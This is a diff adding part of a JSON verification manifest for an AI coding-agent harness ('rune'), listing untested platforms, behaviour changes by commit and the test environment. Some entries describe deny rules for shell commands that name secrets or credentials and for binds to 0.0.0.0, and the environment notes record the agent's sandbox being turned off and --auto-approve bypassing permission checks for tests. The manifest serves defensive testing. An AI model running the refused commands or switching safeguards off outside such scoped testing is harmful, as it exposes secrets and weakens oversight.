+      "id": "the live cache effect (§3.3's open question)",
+      "why": "No frontier arm was authorised. §5.3 costs a frontier pair at about $0.43 at list against ~5% of the weekly Codex allowance, and the founder's standing position is zero spend. Until one runs, Pilot J's two cache reads of exactly zero stay unexplained and the task-state-tail hypothesis stays a hypothesis with a prediction. The 3A document makes no claim about it and neither does this manifest."
+    },
+    {
+      "id": "before/after on a real corpus",
+      "why": "§2.5: the two post-fix eras hold 42 completions between them. No before/after comparison can be made from the 683-session corpus, and none is made. Every 3B number in this manifest is a fixed-script measurement through a mock, which can show what the HARNESS spends and can never show what a model chooses to do once the runtime stops making something expensive. Lane A says this about its own A2 and it is true of the whole phase."
+    },
+    {
+      "id": "the pre-change arms of A3 and A1",
+      "why": "Reproducing the 7-completion pre-change side needs `packages/` reverted, which no pass has done (V-A #5a). What is verified is the post-change side and the control's asymmetry: 6 against 7, on byte-identical scripts."
+    },
+    {
+      "id": "Linux",
+      "why": "See linuxImages[0]. Nothing in this phase has run on Linux. `crates/rune-sandbox/src/linux.rs`'s four `linux::tests` are `#[cfg(target_os = \"linux\")]` and ran zero times here."
+    },
+    {
+      "id": "Windows",
+      "why": "Unchanged and unrun. The watchdog is `#[cfg(unix)]`; the reaper falls back to killing on liveness alone there and says so — reasoned, never executed."
+    },
+    {
+      "id": "ordinary CI runners",
+      "why": "Every number here was taken on one macOS 15 arm64 laptop, with the agent's Bash sandbox OFF for the suites that need sockets. Nothing was run in CI."
+    },
+    {
+      "id": "the reviewer's wall-clock win",
+      "why": "B1's headline benefit is 131 corpus reviewer calls at a median 7.64 s each. The mock answers instantly, so the fixed-script arms measure the CALL COUNT (6 → 1) and prove none blocks — they do not and cannot measure the seconds a user gets back."
+    },
+    {
+      "id": "`listUserTurns` and the trusted-intent corpus, on the installed binary",
+      "why": "Two of 793d0ce's four sites have no surface a piped process can reach: `/rewind` is an interactive REPL command whose line editor does not read piped stdin (tried, twice, with delays — the process reads EOF and exits without running the command), and the trusted-intent corpus is consumed inside a permission check that `--auto-approve` bypasses. Both are pinned at this source by tests/unit/orchestrator/engine-harness-turns.test.ts, session-transcript.test.ts and tests/unit/protocol/replay.test.ts, inside the 4,734/0/1 unit run. The third site, `eventsToTranscript`, WAS observed on the installed binary."
+    },
+    {
+      "id": "prune --apply",
+      "why": "`rune doctor prune-checkpoints` was DRY RUN only, as every pass before this one: it reports `would remove 428 rows, 106 MB — nothing was deleted`. `--apply` has still never been run and `--prune-backups` was never passed, so the 2,173 MB of installer backups in ~/.rune/bin are untouched."
+    }
+  ],
+  "behaviorChanges": [
+    {
+      "from": "Lane 0 / 9279bc7",
+      "change": "`CostTracker.record`'s signature is now `record(model, provider, usage, attribution, timestamp?)`. Every usage and cost row carries a required `role`, so an untagged caller is a compile error; `recordCost`'s `request` parameter is no longer optional.",
+      "cost": "A few dozen bytes per cost row. One missed call site made the comparison rig's budget cap dead until 2451bc1 found it."
+    },
+    {
+      "from": "Lane 0 / 9279bc7",
+      "change": "Cost rows carry `startedAt` and `latencyMs`, stamped per attempt so back-off is excluded; `PromptComposition` carries `cacheBreakpointIndex` and an 8-hex FNV-1a `prefixHash` over system prompt + tool schemas + stable messages.",
+      "cost": "None on behaviour. The hash is 8 hex characters, which is too few to tell prefix growth from a prefix rewrite — V-L0 #12, still open."
+    },
+    {
+      "from": "Lane 0 / 730fd97",
+      "change": "Nine harness-generated messages now carry an origin: `nudge:harness-notes`, `wrapup:budget-reserve`, `nudge:oversized-output`, `gate:verification-failed`, `nudge:replan-verification`, `image:delivered`, `image:refused`, `halt:final-report`, `nudge:barren-breaker`.",
+      "cost": "None visible. It is what made 793d0ce's bug findable — and, for one commit, what made it worse: more messages carried a marker nothing read."
+    },
+    {
+      "from": "Lane 0 / 730fd97",
+      "change": "`TaskLifecycleChild` gains `startedAt`/`integratedAt`; `ToolCallOutput.usefulEdit` is true when a call named a changed path, false when a write succeeded and named none, absent on a non-write — persisted and restored on replay. Gateway incidents carry `role` and `requestStartedAt`.",
+      "cost": "`usefulEdit` is read by the auto-commit scope, the headless envelope, both TUI surfaces, \"time since the last useful edit\" and A3's waiver, so 1625db1's correction to it moved all five."
+    },
+    {
+      "from": "Lane A / 8691b34",
+      "change": "Fewer refused finishes: a write that changed no file no longer re-arms the evidence gates after a green check — one fewer completion and one fewer \"Stop —\" message per run that does it.",
+      "cost": "Downward. Two gates stand down, not five (V-A's correction to the lane's own prose)."
+    },
+    {
+      "from": "Lane A / 8691b34",
+      "change": "STRICTER: a run whose plan closes on a report step with unevidenced writes behind it is now refused its finish once.",
+      "cost": "One completion, on runs that do it. The only change in the stricter direction in the whole lane."
+    },
+    {
+      "from": "Lane A / 8691b34",
+      "change": "A late citation — a batch of nothing but `record_evidence` naming checks that ran in the immediately previous completion — is carried forward and the turn refunded through the existing `TurnRefunds` cap. `record_evidence`, `read_back`, `note_hypothesis` and `record_decision` stop counting toward the single-read streak.",
+      "cost": "Three turns given back on the 3-criterion script. Un-farmable: the cap moved the ceiling 8 → 10 and no further."
+    },
+    {
+      "from": "Lane B / bc8977f + Fix B / 80aa136",
+      "change": "Six command classes clear mechanically instead of paying a reviewer — but only in their exact shapes, after the repair: named-tool package runners (the tool as a whole token), `gh`/`glab` reads WITHOUT `download`, cloud enumerations that name no identity subject, nine real dev servers rather than twenty programs, `node --check <file>` and nothing else, and network tool arguments that merely contain payload letters.",
+      "cost": "Fewer approval pauses. Thirteen programs LEFT the dev-server list, so `entr`, `watchexec`, `just`, `mise`, `direnv`, `pm2`, `foreman`, `overmind`, `honcho`, `concurrently`, `air`, `celery` and `nodemon` are screened again; `[permissions.autoMode] safeCommands` is the escape hatch."
+    },
+    {
+      "from": "Lane B / bc8977f",
+      "change": "NEWLY REFUSED: any shell segment naming a secret, password, credential, token, keyvault, keychain, keyring, kms or secretsmanager.",
+      "cost": "A legitimate `aws secretsmanager list-secrets` now asks. That is the intended direction."
+    },
+    {
+      "from": "Fix B / 80aa136",
+      "change": "A NEW REFUSAL, not a new screen: `-a 0.0.0.0`, `-H 0.0.0.0` and `--hostname 0.0.0.0` trip `beyond-loopback-bind`. `http-server -a 0.0.0.0 /` used to run.",
+      "cost": "`docs/threat-model.md:57-60` named only `--host`, `--bind` and `0.0.0.0:<port>` and was stale from the moment this landed. Corrected by this pass."
+    },
+    {
+      "from": "Lane B / bc8977f",
+      "change": "A hung reviewer costs ONE deadline instead of two (`budgetMs`, `retryReserveMs = min(timeoutMs/4, 2_000)`); the first attempt now has 10 s rather than 12 s at the default. The supervisor's refusal message reads \"N observations are already waiting on the reviewer, the oldest for 4.2s\", and `supervisor_skipped` carries `timings.queueWaitMs`.",
+      "cost": "The worst case is capped at one deadline instead of 24 s."
+    },
+    {
+      "from": "Lane C / 4c04e03",
+      "change": "USER-VISIBLE TEXT: a citation for a command that ran but is not a recognised check now gets `execution receipt only — ran, exit N, not a recognised check; not replayed on the parent`, plus a next-step sentence telling the model to write the assertion as a test file a runner collects, and that re-citing the same command in other words will get the same answer.",
+      "cost": "It is in the reply, never in `Evidence.detail`. `rungForCommand`'s verdict logic is byte-identical: nothing about what the runtime AWARDS moved."
+    },
+    {
+      "from": "Fix C / 5671ef7",
+      "change": "Every compaction reads its new segment at 2,400 characters a tool result. A merge is no longer cheaper than a read, and resume fidelity after two or more compactions is restored. A result an ADOPTED compaction already showed the summarizer in full may be re-rendered at 900 characters; edit-tool and patch-shaped results are exempt even then.",
+      "cost": "Lane C's headline 12,000-byte saving is gone. The lane's net prompt saving is 0 bytes; its net correctness change is two closed holes."
+    },
+    {
+      "from": "Fix C / 5671ef7",
+      "change": "`# Built-in modes on request` is back on the working-phase prompt whenever a mode tool is loaded (+741 B per completion on such runs, 0 in the default configuration), and a request that asks for a built-in mode gets the routing just-in-time when the prefix is not carrying it — 739 B injected once per session.",
+      "cost": "Runs that used to get the routing nowhere at all now get it. A mode asked for by an `interject()` mid-run still does not: that is in the backlog."
+    },
+    {
+      "from": "Fix C / 5671ef7",
+      "change": "The compaction summary and the `[Session context]` block carry a harness origin. No new rows are persisted.",
+      "cost": "None. The naive fix — persisting the summary as a `user_msg` — was refused on purpose, because persisted `user_msg` content is fed to the permission check as trusted user input."
+    },
+    {
+      "from": "Fix A / 1625db1",
+      "change": "`multi_edit` does not write when the bytes would not change — a no-op leaves mtime alone, and the result gains `prior_hash` and `unchanged`. `usefulEdit` now means the content moved, for all four write tools.",
+      "cost": "Everything that reads `usefulEdit` changed with it: the auto-commit scope, the headless envelope, both TUI surfaces, the idle-since-last-edit measure and A3's waiver."
+    },
+    {
+      "from": "Fix A / 1625db1",
+      "change": "An empty diff is trusted only for `action === \"updated\"`. A move, a delete of an empty file and an add of an empty file always re-arm the gates. A refused `record_evidence` earns no refund and no audit line.",
+      "cost": "A3 excuses strictly less than it did when the lane landed."
+    },
+    {
+      "from": "Fix A / 7eb6ca8",
+      "change": "ON CODEX ONLY: history carries the ledger blocks it was sent with, so a folded tail stays folded into that message on every later request. `measureComposition` gained `tailInMessages` so the composition row measures the real request.",
+      "cost": "The third codex request is 1,587 bytes against 1,085 (+502, one task-state block in this fixture) — and 48% of each request stops being re-billed every turn."
+    },
+    {
+      "from": "Fix L0 / cb1b700",
+      "change": "A row whose caller gave no role is KEPT and tagged `unattributed` — a tenth `CallRole` — instead of throwing and taking the row with it. `startedAt` is the call's stamp, taken once before the retry ladder and the fallback chain; the answering attempt is `attemptStartedAt`, present only when it differs.",
+      "cost": "Runtime enforcement of I1 is now observational rather than fatal. That is deliberate: throwing is what killed the comparison rig's cap."
+    },
+    {
+      "from": "Fix B / 6637d68",
+      "change": "The auto-safety eval prints a new section, \"Supervisor shapes (93 rows, scored APART …)\", and the JSON payload carries `supervisorShapes`.",
+      "cost": "Baselines written before this commit lack the field, but the comparison path reads only `overall`, so no baseline rewrite was needed."
+    },
+    {
+      "from": "3C / 793d0ce",
+      "change": "A `user_msg` row the harness wrote is no longer counted as a turn the user took, at four sites: `/rewind`'s turn list, `replayEvents`, `eventsToTranscript` and the permission check's trusted-intent corpus.",
+      "cost": "`/rewind <n>` now numbers only the founder's own messages, which is a renumbering of an existing surface. The rows themselves are unchanged and a detached run's database still shows why the run went on."
+    },
+    {
+      "from": "3C / this pass",
+      "change": "`tests/helpers/scenario.ts` gained `RunOptions.cli` / `RUNE_SCENARIO_CLI`, so the same rig can be pointed at a compiled binary. Test-only; no product code and no shipped behaviour.",
+      "cost": "None. The default path builds the same argv it built before, and a bad path throws rather than falling back."
+    }
+  ],
+  "environment": {
+    "host": "macOS 15 (Darwin 25.6.0), arm64",
+    "disk": "`df -h /` before every heavy step. 19 GiB free at the start of this pass, 19 GiB through the suites, 29 GiB at the end (the integration run's temp directories clearing). Never near the 1 GiB stop line.",
+    "diskIncident": "The FIRST 3C sitting was stopped outright: the disk reached 0 bytes free, from an unrelated build in ~/Project/Say running at the same time. That is why this manifest exists as a second pass and why Step 1 was an audit of the first sitting's artifacts rather than a fresh run of everything. The installer's own note is a standing contributor: it reports 105 files, 27 generations and 2,173.5 MB of backups in ~/.rune/bin, of which keeping the newest five would reclaim 1,755 MB. `--prune-backups` was NOT passed.",
+    "sandbox": "The agent's Bash tool sandboxes commands by default. Run with the sandbox OFF, and only these: the bun suites (`Bun.serve({port: 0})` fails with EADDRINUSE under the restricted profile), `bun run eval` and `bun run eval:auto-safety --offline`, the installed-binary drivers, and the docker probe.",
+    "docker": "Daemon does not answer; no `/var/run/docker.sock`. See linuxImages[0].",
+    "network": "No egress beyond 127.0.0.1. Every model call in this pass went to a loopback mock started by the test process. `assertNoLiveCredentials` runs on each child's environment before the process starts, and the environment is BUILT rather than inherited, so no child held a credential to spend with.",
+    "founderDatabase": "`~/.rune/rune.db` was never written. The lifecycle suite's own ledger guard read 2,931 cost rows before and after with the newest row unmoved at 2026-09-10T19:20:44.046Z. `rune doctor prune-checkpoints` was dry run only.",
+    "installs": "None by this pass. The binary under test was installed by the first 3C sitting from this same commit; its three hashes were re-verified here and match install-after.txt."
+  },
+  "limitations": [
+    "Every number in the `phase3` block that is labelled `before` for Lanes A and B was measured by the lane that made the change, on its own rig, against its own pre-change tree. This pass re-measured the AFTER side on the installed binary and the controls' asymmetry; it did not revert `packages/` to re-take the before side.",
+    "The fix-report row→commit mapping is stated explicitly only in `fix-l0-report.md`. For fix-a, fix-b and fix-c it is read off commit subjects and is marked `inferred` in the findings table. A reader who needs certainty should read the four fix reports under `.codex/audit-20260910/handoff/phase3/`.",
+    "Three reports quote the `# Built-in modes on request` section as 739 B, 740 B and a 741 B delta. Nothing in this manifest depends on which is right and no attempt was made to reconcile them."
+  ]
+}
